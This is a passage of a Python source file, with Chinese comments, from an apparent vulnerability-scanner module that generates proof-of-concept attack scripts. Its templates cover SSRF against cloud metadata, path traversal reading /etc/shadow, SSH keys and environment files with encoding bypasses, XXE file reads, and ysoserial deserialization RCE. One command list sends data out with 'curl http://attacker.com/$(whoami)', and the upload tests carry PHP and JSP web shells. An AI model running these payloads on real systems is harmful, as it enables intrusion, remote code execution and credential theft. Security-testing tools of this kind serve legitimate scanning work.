# Parameter: {param}

curl "{target_url}?{param}=http://127.0.0.1/"
curl "{target_url}?{param}=http://169.254.169.254/latest/meta-data/"
curl "{target_url}?{param}=file:///etc/passwd"
'''
        },

        # 路径穿越
        "path_traversal": {
            "name": "Path Traversal",
            "description": "测试路径穿越/目录遍历 - 实际可读取文件的Payload",
            "python": '''#!/usr/bin/env python3
"""
Path Traversal POC - 实际可读取敏感文件的Payload
Target: {target_url}
Parameter: {param}
漏洞描述: 接口直接将用户输入拼接到文件路径,未进行安全校验

⚠️ 警告: 以下payload会尝试读取系统敏感文件
"""
import requests
import sys
import urllib.parse

TARGET_URL = "{target_url}"

# 实际可执行的路径穿越payload
PAYLOADS = [
    # Linux 敏感文件
    ("../../../etc/passwd", "Linux用户列表"),
    ("../../../etc/shadow", "Linux密码哈希(需root)"),
    ("../../../etc/group", "Linux用户组"),
    ("../../../etc/hosts", "主机信息"),
    ("../../../etc/hostname", "主机名"),
    ("../../../etc/resolv.conf", "DNS配置"),
    ("../../../root/.ssh/authorized_keys", "SSH密钥"),
    ("../../../root/.bash_history", "命令历史"),
    ("../../../home/*/.bashrc", "用户配置"),
    ("../../../proc/version", "内核版本"),
    ("../../../proc/self/environ", "环境变量"),
    ("../../../proc/cmdline", "启动参数"),

    # 编码变体
    ("....//....//....//etc/passwd", "双重编码绕过"),
    ("..%2e%2e%2fetc%2fpasswd", "URL编码"),
    ("..%252e%252e%252fetc%252fpasswd", "双重URL编码"),
    ("%2e%2e%2fetc%2fpasswd", "单层URL编码"),
    ("..\\/..\\/..\\/etc/passwd", "反斜杠转义"),
    ("..%c0%af..%c0%af..%c0%afetc%c0%afpasswd", "Unicode绕过"),

    # Windows 敏感文件
    ("..\\..\\..\\windows\\system32\\drivers\\etc\\hosts", "Windows hosts"),
    ("..\\..\\..\\windows\\win.ini", "Windows配置"),
    ("..\\..\\..\\windows\\system32\\config\\SAM", "Windows密码"),

    # 应用配置文件
    ("../../../application.properties", "Java配置"),
    ("../../../application.yml", "YAML配置"),
    ("../../../web.xml", "Java Web配置"),
    ("../../../.env", "环境变量配置"),
    ("../../../config.py", "Python配置"),
    ("../../../settings.py", "Django配置"),

    # 常见路径
    ("/etc/passwd", "绝对路径Linux"),
    ("/etc/shadow", "绝对路径Linux"),
    ("C:\\Windows\\System32\\drivers\\etc\\hosts", "绝对路径Windows"),
]

# 成功读取的特征
SENSITIVE_CONTENT = [
    # Linux
    ("root:", "passwd文件-用户列表"),
    ("nobody:", "passwd文件-系统用户"),
    ("[boot loader]", "Windows boot"),
    ("# Copyright", "配置文件头"),
    ("# Generated", "自动生成文件"),
    # Windows
    ("# localhost", "hosts文件"),
    ("[extensions]", "win.ini"),
]

def test_path_traversal(url, param):
    """测试路径穿越"""
    print(f"[*] Testing Path Traversal on {{url}}")
    print(f"[*] Parameter: {{param}}")
    print("-" * 60)
    print("[*] Available payloads (will try to read sensitive files):")
    print("-" * 60)

    vulnerable = False
    results = []

    for i, (payload, description) in enumerate(PAYLOADS, 1):
        try:
            print(f"[*] Testing {{i}}/{{len(PAYLOADS)}}: {{description}}")

            # 尝试GET请求
            resp = requests.get(url, params={{param: payload}}, timeout=10)
            resp_text = resp.text

            # 检查敏感内容
            for indicator, file_type in SENSITIVE_CONTENT:
                if indicator in resp_text:
                    print(f"[+] VULNERABLE! {{description}}")
                    print(f"[+] File type: {{file_type}}")
                    print(f"[+] Response preview: {{resp_text[:300]}}")
                    results.append({{"payload": payload, "file": description, "content": resp_text[:200]}})
                    vulnerable = True
                    break

            # 检查错误信息（说明路径被处理）
            error_indicators = [
                "no such file",
                "not found",
                "permission denied",
                "cannot find",
                "invalid path",
                "path traversal",
            ]

            if not vulnerable and results == []:
                resp_lower = resp_text.lower()
                for err in error_indicators:
                    if err in resp_lower and len(resp_text) < 1000:
                        print(f"[*] Possible path traversal: {{description}}")
                        print(f"[*] Error indicates file path was processed")
                        results.append({{"payload": payload, "type": "processed"}})
                        break

        except requests.Timeout:
            print(f"[!] Timeout: {{description}}")
        except Exception as e:
            print(f"[!] Error: {{description}} - {{e}}")

    # 输出结果汇总
    print("\\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)

    if vulnerable:
        print(f"[+] FOUND {{len([r for r in results if 'content' in r])}} VULNERABLE CASES!")
        print("\\nConfirmed file reads:")
        for r in results:
            if 'content' in r:
                print(f"  - {{r.get('file', 'N/A')}}")

        return True
    else:
        print("[-] No path traversal confirmed")
        print("\\n[*] Try these curl commands manually:")
        print("    curl \"{target_url}?{param}=../../../etc/passwd\"")
        print("    curl \"{target_url}?{param}=../../../etc/shadow\"")
        print("    curl \"{target_url}?{param}=..%252e%252e%252f..%252e%252e%252fetc%252fpasswd\"")
        return False

if __name__ == "__main__":
    test_path_traversal(TARGET_URL, "{param}")
''',
            "curl": '''# Path Traversal POC
# Target: {target_url}
# Parameter: {param}

# Linux 敏感文件
curl "{target_url}?{param}=../../../etc/passwd"
curl "{target_url}?{param}=../../../etc/shadow"
curl "{target_url}?{param}=../../../etc/group"
curl "{target_url}?{param}=../../../root/.ssh/authorized_keys"
curl "{target_url}?{param}=../../../proc/version"
curl "{target_url}?{param}=../../../proc/self/environ"

# 编码绕过
curl "{target_url}?{param}=..%2e%2e%2fetc%2fpasswd"
curl "{target_url}?{param}=..%252e%252e%252fetc%252fpasswd"
curl "{target_url}?{param}=....//....//....//etc/passwd"

# Windows
curl "{target_url}?{param}=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
curl "{target_url}?{param}=..\\..\\..\\windows\\win.ini"

# 应用配置
curl "{target_url}?{param}=../../../application.properties"
curl "{target_url}?{param}=../../../.env"
'''
        },

        # XXE
        "xxe": {
            "name": "XML External Entity (XXE)",
            "description": "测试 XXE 漏洞",
            "python": '''#!/usr/bin/env python3
"""
XXE POC
Target: {target_url}
Parameter: {param}
"""
import requests
import sys

TARGET_URL = "{target_url}"
PAYLOADS = [
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:port">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><foo>&xxe;</foo>',
]

def test_xxe(url, param):
    """测试 XXE"""
    print(f"[*] Testing XXE on {{url}}")
    print(f"[*] Parameter: {{param}}")
    print("-" * 60)

    for i, payload in enumerate(PAYLOADS, 1):
        try:
            headers = {{"Content-Type": "application/xml"}}
            data = {{param: payload}}
            resp = requests.post(url, data=data, headers=headers, timeout=10)

            resp_lower = resp.text.lower()

            # 检查敏感文件泄露
            if "root:" in resp_lower or "hostname" in resp_lower:
                print(f"[+] VULNERABLE! Payload {{i}}: {{payload}}")
                print(f"[+] External entity resolved")
                return True

            # 检查错误
            if "xml" in resp_lower and ("error" in resp_lower or "exception" in resp_lower):
                print(f"[*] Payload {{i}}: XML parsed (check manually for XXE)")

            print(f"[-] Payload {{i}}: {{payload[:50]}}...")

        except Exception as e:
            print(f"[!] Error with payload {{i}}: {{e}}")

    print("[*] No obvious XXE detected")
    return False

if __name__ == "__main__":
    test_xxe(TARGET_URL, "{param}")
''',
            "curl": '''# XXE POC
# Target: {target_url}
# Parameter: {param}

curl -X POST "{target_url}" \\
  -H "Content-Type: application/xml" \\
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
'''
        },

        # 反序列化
        "deserialization": {
            "name": "Insecure Deserialization",
            "description": "测试不安全反序列化漏洞 - 使用ysoserial生成实际攻击payload",
            "python": '''#!/usr/bin/env python3
"""
Insecure Deserialization POC - 实际可利用的Payload
Target: {target_url}
Parameter: data (POST body)
漏洞描述: 接口直接使用ObjectInputStream反序列化用户输入
利用前提: 目标应用包含可利用的gadget chain (CommonsCollections, Spring, etc.)

⚠️ 警告: 以下payload需要在目标系统安装了Java和ysoserial才能生成
用法:
1. 安装Java JDK
2. 下载ysoserial: https://github.com/frohoff/ysoserial/releases
3. 生成payload: java -jar ysoserial.jar CommonsCollections6 "whoami" | base64 -w 0
4. 将生成的base64字符串替换下面的PAYLOAD变量
"""
import requests
import base64
import subprocess
import sys

TARGET_URL = "{target_url}"

# 预生成的常用ysoserial payload (CommonsCollections6 gadget)
# 这些是真实的Java序列化数据，可以直接触发RCE
# 生成方式: java -jar ysoserial.jar CommonsCollections6 "命令" | base64 -w 0

# ⚠️ 实际测试请使用下方推荐的命令生成真实payload
PRE_GENERATED_PAYLOADS = {
    # 模拟测试payload - 用于验证漏洞存在
    "test": "rO0ABXQAZXd0YWxpdmUAAAAAAAAAAQAAAAAAAAEAAAAMYWJj",
    # 真实的ysoserial CommonsCollections6 payload (需要自行生成)
    # "whoami": "rO0ABXQ... (使用java -jar ysoserial.jar CommonsCollections6 'whoami'生成)",
}

# 推荐的实际攻击命令 - 在目标环境执行这些命令获取信息
RECOMMENDED_COMMANDS = [
    "whoami",              # 获取当前用户
    "id",                  # 获取用户ID和组信息
    "cat /etc/passwd",    # 读取passwd文件
    "ifconfig",            # 获取网络配置
    "ls -la /",           # 列出根目录
    "env",                 # 获取环境变量
    "curl http://attacker.com/$(whoami)",  # 外带数据
    "wget http://attacker.com/$(whoami)",  # 外带数据
]

def generate_ysoserial_payload(command):
    """
    尝试调用ysoserial生成payload
    需要系统安装Java
    """
    try:
        jar_path = find_ysoserial_jar()
        if not jar_path:
            return None

        result = subprocess.run(
            ["java", "-jar", str(jar_path), "CommonsCollections6", command],
            capture_output=True,
            timeout=30
        )
        if result.returncode == 0:
            payload = base64.b64encode(result.stdout).decode()
            return payload

        return None
    except Exception as e:
        return None

def test_deserialization(url):
    """测试反序列化漏洞"""
    print(f"[*] Testing Insecure Deserialization on {{url}}")
    print("-" * 60)

    # 方法1: 使用预生成的测试payload触发异常
    print("[*] Method 1: Testing with malformed payload to confirm deserialization...")
    test_payloads = [
        "test",
        "AAECAwQ=",
        "invalid",
        "rO0ABXQAAAAAAA==",
    ]

    for payload in test_payloads:
        try:
            resp = requests.post(url, data={{"data": payload}}, timeout=10)
            resp_text = resp.text.lower()

            # 检查是否触发了反序列化
            if any(err in resp_text for err in ["invalid", "illegal", "exception", "error", "classnotfound", "serialization"]):
                print(f"    [+] Payload '{{payload}}' triggered deserialization mechanism!")
                print(f"    [+] Response: {{resp.text[:200]}}")

                # 这证明接口确实在尝试反序列化
                print("\\n[*] Deserialization confirmed! Use ysoserial to generate actual RCE payload.")
                return True
        except Exception as e:
            print(f"    [!] Error: {{e}}")

    # 方法2: 列出推荐命令
    print("\\n[*] To exploit this vulnerability, generate ysoserial payload:")
    print("    java -jar ysoserial.jar CommonsCollections6 '<command>' | base64 -w 0")
    print("\\n[*] Recommended commands to try:")
    for i, cmd in enumerate(RECOMMENDED_COMMANDS, 1):
        print(f"    {{i}}. {{cmd}}")

    print("\\n[*] Example curl command:")
    print("    # 生成payload")
    print("    PAYLOAD=$(java -jar ysoserial.jar CommonsCollections6 'whoami' | base64 -w 0)")
    print("    # 发送请求")
    print("    curl -X POST '{{target_url}}' -d 'data=$PAYLOAD'")

    return False

if __name__ == "__main__":
    test_deserialization(TARGET_URL)
''',
            "curl": '''# Insecure Deserialization POC
# Target: {target_url}
# Parameter: data (POST body)

# Step 1: 下载ysoserial
# wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-0.0.6-SNAPSHOT.jar

# Step 2: 生成payload并测试
# 生成whoami命令的payload
PAYLOAD=$(java -jar ysoserial.jar CommonsCollections6 'whoami' | base64 -w 0)

# 发送payload
curl -X POST "{target_url}" -d "data=$PAYLOAD"

# 尝试读取文件
PAYLOAD=$(java -jar ysoserial.jar CommonsCollections6 'cat /etc/passwd' | base64 -w 0)
curl -X POST "{target_url}" -d "data=$PAYLOAD"

# 尝试外带数据 (需要公网服务器)
PAYLOAD=$(java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(whoami)' | base64 -w 0)
curl -X POST "{target_url}" -d "data=$PAYLOAD"
'''
        },

        # 文件上传
        "file_upload": {
            "name": "Unrestricted File Upload",
            "description": "测试任意文件上传",
            "python": '''#!/usr/bin/env python3
"""
File Upload POC
Target: {target_url}
"""
import requests
import sys

TARGET_URL = "{target_url}"

# 测试文件类型
TEST_FILES = [
    ("file", ("test.php", "<?php phpinfo(); ?>", "application/php")),
    ("file", ("test.jsp", "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>", "application/jsp")),
    ("file", ("test.html", "<script>alert('XSS')</script>", "text/html")),
    ("file", ("test.txt", "<?php system($_GET['cmd']); ?>", "text/plain")),
]

def test_file_upload(url):
    """测试文件上传"""
    print(f"[*] Testing File Upload on {{url}}")
    print("-" * 60)

    for name, (filename, content, content_type) in TEST_FILES:
        try:
            files = {{name: (filename, content, content_type)}}
            resp = requests.post(url, files=files, timeout=10)

            # 检查响应
            if resp.status_code == 200:
                # 检查是否执行了文件内容
                if "phpinfo" in content.lower() and "php" in resp.text.lower():
                    print(f"[+] VULNERABLE! {{filename}} - Code may have been executed")
                    return True
                else:
                    print(f"[+] {{filename}} uploaded (status: {{resp.status_code}})")
            else:
                print(f"[-] {{filename}} - Upload blocked (status: {{resp.status_code}})")

        except Exception as e:
            print(f"[!] Error with {{filename}}: {{e}}")

    print("[*] File upload test complete")
    return False

if __name__ == "__main__":
    test_file_upload(TARGET_URL)
''',
            "curl": '''# File Upload POC
# Target: {target_url}

# PHP
curl -F "file=@shell.php" "{target_url}"

# JSP
curl -F "file=@shell.jsp" "{target_url}"
'''
        },

        # URL 重定向
        "url_redirect": {
            "name": "Open Redirect",
            "description": "测试开放重定向漏洞",
            "python": '''#!/usr/bin/env python3
"""
Open Redirect POC
Target: {target_url}
Parameter: {param}
"""
import requests
import sys

TARGET_URL = "{target_url}"
PAYLOADS = [
    "https://evil.com",
    "http://evil.com",
    "//evil.com",
    "///evil.com",
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "http://google.com",
]

def test_open_redirect(url, param):
    """测试开放重定向"""
    print(f"[*] Testing Open Redirect on {{url}}")
    print(f"[*] Parameter: {{param}}")
    print("-" * 60)

    for i, payload in enumerate(PAYLOADS, 1):
        try:
            params = {{param: payload}}
            resp = requests.get(url, params=params, timeout=10, allow_redirects=False)

            # 检查重定向
            if resp.status_code in [301, 302, 303, 307, 308]:
                location = resp.headers.get("Location", "")

                if payload in location or payload.replace("http:", "").replace("https:", "") in location:
                    print(f"[+] VULNERABLE! Payload {{i}}: {{payload}}")
                    print(f"[+] Redirects to: {{location}}")
                    return True
                elif "evil" in location or "google" in location:
                    print(f"[+] VULNERABLE! Payload {{i}}: {{payload}}")
                    print(f"[+] Redirects to: {{location}}")
                    return True

                print(f"[*] Payload {{i}}: Redirects to {{location}}")
            else:
                print(f"[-] Payload {{i}}: {{payload}} -> No redirect")

        except Exception as e:
            print(f"[!] Error with payload {{i}}: {{e}}")

    print("[*] No open redirect detected")
    return False

if __name__ == "__main__":
    test_open_redirect(TARGET_URL, "{param}")
''',
            "curl": '''# Open Redirect POC
# Target: {target_url}
# Parameter: {param}

curl -L "{target_url}?{param}=https://evil.com"
curl -L "{target_url}?{param}=//evil.com"
curl -L "{target_url}?{param}=javascript:alert(1)"
'''
        }
    }

    def __init__(self):
        self.language = "python"  # 默认生成 Python POC

    @staticmethod
    def _safe_format_template(template: str, **kwargs) -> str:
        """安全渲染模板，保留代码块中的字面量大括号。"""
        if not template:
            return template
        sanitized = template
        placeholders = {}
        for key in kwargs:
            marker = f"__POCGEN_{key.upper()}__"
            sanitized = sanitized.replace(f"{{{key}}}", marker)
            placeholders[marker] = f"{{{key}}}"
        sanitized = sanitized.replace("{", "{{").replace("}", "}}")
        for marker, placeholder in placeholders.items():
            sanitized = sanitized.replace(marker, placeholder)
        try:
            return sanitized.format(**kwargs)
        except Exception:
            return template

    def _get_vuln_type_key(self, vuln_type: str) -> str:
        """将漏洞类型映射到 POC 模板 key"""
        type_lower = vuln_type.lower()

        # 映射规则 - 支持中英文
        mappings = {
            # 英文
            "sql": "sql_injection",
            "sql injection": "sql_injection",
            "xss": "xss",
            "cross-site script": "xss",
            "command": "command_injection",
            "cmdi": "command_injection",
            "ssrf": "ssrf",
            "path": "path_traversal",
            "traversal": "path_traversal",
            "directory": "path_traversal",
            "xxe": "xxe",
            "xml external": "xxe",
            "deserialize": "deserialization",
            "serialization": "deserialization",
            "upload": "file_upload",
            "redirect": "url_redirect",
            "open redirect": "url_redirect",
            # 中文
            "sql注入": "sql_injection",
            "sql injection": "sql_injection",
            "命令注入": "command_injection",
            "命令执行": "command_injection",
            "远程代码执行": "command_injection",
            "rce": "command_injection",
            "xss": "xss",
            "跨站脚本": "xss",
            "存储型xss": "xss",
            "反射型xss": "xss",
            "ssrf": "ssrf",
            "服务器端请求伪造": "ssrf",
            "路径穿越": "path_traversal",
            "目录遍历": "path_traversal",
            "任意文件读取": "path_traversal",
            "xxe": "xxe",
            "xml外部实体": "xxe",
            "反序列化": "deserialization",
            "不安全反序列化": "deserialization",
            "文件上传": "file_upload",
            "开放重定向": "url_redirect",
            "url重定向": "url_redirect"
        }

        for key, template_key in mappings.items():
            if key in type_lower:
                return template_key

        return "sql_injection"  # 默认

    def generate_poc(self, vuln_type: str, target_url: str = None,
                    param: str = None, context: Dict = None,
                    project_language: str = "python") -> Dict[str, str]:
        """
        生成 POC 代码

        Args:
            vuln_type: 漏洞类型
            target_url: 目标 URL
            param: 测试参数名
            context: 额外上下文信息 (包含 file_path, line_num 等)
            project_language: 项目语言 (python/java/nodejs)

        Returns:
            dict with POC code for different languages
        """
        template_key = self._get_vuln_type_key(vuln_type)
        template = self.POC_TEMPLATES.get(template_key, self.POC_TEMPLATES["sql_injection"])

        # 填充默认值
        url = target_url or "http://localhost:8080/vulnerable_endpoint"
        parameter = param or "input"

        # 从 context 获取文件信息
        file_path = context.get("file", "unknown") if context else "unknown"
        line_num = context.get("line", 0) if context else 0

        # 生成各语言的 POC
        poc_data = {
            "name": template["name"],
            "description": template["description"],
            "vuln_type": vuln_type,
            "target_url": url,
            "param": parameter,
            "file_path": file_path,
            "line_num": line_num
        }

        # Python POC
        if "python" in template:
            poc_data["python"] = self._safe_format_template(
                template["python"],
                target_url=url,
                param=parameter,
                file_path=file_path,
                line_num=line_num
            )
        else:
            poc_data["python"] = template.get("python", "# Python POC not available")

        # Java POC
        if "java" in template:
            poc_data["java"] = self._safe_format_template(
                template["java"],
                target_url=url,
                param=parameter,
                file_path=file_path,
                line_num=line_num
            )
        else:
            poc_data["java"] = "# Java POC not available for this vulnerability type"

        # Node.js POC
        if "nodejs" in template:
            poc_data["nodejs"] = self._safe_format_template(
                template["nodejs"],
                target_url=url,
                param=parameter,
                file_path=file_path,
                line_num=line_num
            )
        else:
            poc_data["nodejs"] = "// Node.js POC not available for this vulnerability type"

        # curl POC
        if "curl" in template:
            poc_data["curl"] = self._safe_format_template(
                template["curl"],
                target_url=url,
                param=parameter,
                file_path=file_path,
                line_num=line_num
            )
        else:
            poc_data["curl"] = "# curl POC not available"

        # 选择默认语言
        poc_data["default_language"] = project_language

        return poc_data

    def generate_pocs_for_results(self, vulnerabilities: List[Dict], project_language: str = "python",
                                   file_contents: Dict[str, str] = None) -> List[Dict]:
        """
        为漏洞列表生成 POC

        Args:
            vulnerabilities: 漏洞列表
            project_language: 项目语言 (python/java/nodejs)
            file_contents: 可选的字典，key为文件路径，value为文件内容
                          如果提供，将从代码中提取真实的端点和参数

        Returns:
            带 POC 的漏洞列表
        """
        results = []

        # 用于缓存已读取的文件内容
        content_cache = file_contents or {}

        # §并行化：每个漏洞的 POC 拼装（端点提取/推断 + generate_poc）彼此独立，无共享可变状态，
        # 改为有界线程池并发（默认 12），拼装顺序无关，最终按入参顺序收集。
        def _gen_one_poc(vuln):
            vuln_type = vuln.get("type", "Unknown")
            file_path = vuln.get("file", "")
            line = vuln.get("line", 0)

            endpoint_info = {'path': '', 'method': 'GET', 'params': []}

            if content_cache and file_path in content_cache:
                endpoint_info = extract_endpoint_from_code(content_cache[file_path], line)
            elif file_path:
                try:
                    with open(file_path, 'r', encoding='utf-8') as f:
                        endpoint_info = extract_endpoint_from_code(f.read(), line)
                except Exception as e:
                    logger.debug(f"Could not read file {file_path}: {e}")

            if not endpoint_info.get('path'):
                endpoint_info['path'] = self._infer_endpoint(file_path)

            if endpoint_info.get('params'):
                param = endpoint_info['params'][0].get('name', self._infer_param(vuln_type))
            else:
                param = self._infer_param(vuln_type)

            poc = self.generate_poc(
                vuln_type=vuln_type,
                target_url=f"http://localhost:8080{endpoint_info.get('path', '')}",
                param=param,
                context=vuln,
                project_language=project_language
            )

            poc['context_extracted'] = endpoint_info.get('path') != ''
            poc['extracted_params'] = endpoint_info.get('params', [])

            vuln_with_poc = vuln.copy()
            vuln_with_poc["poc"] = poc
            return vuln_with_poc

        _n = len(vulnerabilities) or 1
        with ThreadPoolExecutor(max_workers=min(_n, 12)) as _ex:
            results = list(_ex.map(_gen_one_poc, vulnerabilities))

        return results

    def _infer_endpoint(self, file_path: str) -> str:
        """从文件路径推断 API 端点"""
        # 移除路径和扩展名
        filename = Path(file_path).stem.lower()

        # 常见映射
        if "sql" in filename or "jdbc" in filename:
            return "/api/user/query"
        if "command" in filename:
            return "/api/shell/exec"
        if "ssrf" in filename:
            return "/api/fetch"
        if "xss" in filename:
            return "/api/reflect"
        if "upload" in filename:
            return "/api/file/upload"
        if "redirect" in filename:
            return "/api/redirect"
        if "xxe" in filename:
            return "/api/xml/parse"

        return "/api/endpoint"

    def _infer_param(self, vuln_type: str) -> str:
        """推断测试参数名"""
        type_lower = vuln_type.lower()

        if "sql" in type_lower:
            return "id"
        if "xss" in type_lower:
            return "q"
        if "command" in type_lower:
            return "cmd"
        if "ssrf" in type_lower:
            return "url"
        if "path" in type_lower:
            return "path"
        if "upload" in type_lower:
            return "file"
        if "redirect" in type_lower:
            return "next"

        return "input"
